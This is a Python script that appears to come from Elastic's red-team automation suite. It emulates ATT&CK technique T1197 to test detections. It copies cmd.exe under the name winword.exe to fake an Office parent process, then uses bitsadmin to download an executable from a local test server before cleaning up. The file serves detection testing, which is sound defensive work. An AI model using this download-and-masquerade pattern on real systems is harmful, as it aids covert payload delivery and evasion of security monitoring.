# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Suspicious BitsAdmin Download File
# RTA: bitsadmin_download.py
# ATT&CK: T1197
# Description: Runs BitsAdmin to download file via command line.


import os
import subprocess

from . import common


@common.requires_os(common.WINDOWS)
def main():
    common.log("Running Windows BitsAdmin to Download")
    server, ip, port = common.serve_web()
    url = "http://" + ip + ":" + str(port) + "/bin/myapp.exe"
    dest_path = os.path.abspath("myapp-test.exe")
    fake_word = os.path.abspath("winword.exe")

    common.log("Emulating parent process: {parent}".format(parent=fake_word))
    common.copy_file("C:\\Windows\\System32\\cmd.exe", fake_word)

    command = subprocess.list2cmdline(['bitsadmin.exe', '/Transfer', '/Download', url, dest_path])
    common.execute([fake_word, "/c", command], timeout=15, kill=True)
    common.execute(['taskkill', '/f', '/im', 'bitsadmin.exe'])

    common.remove_files(dest_path, fake_word)


if __name__ == "__main__":
    exit(main())
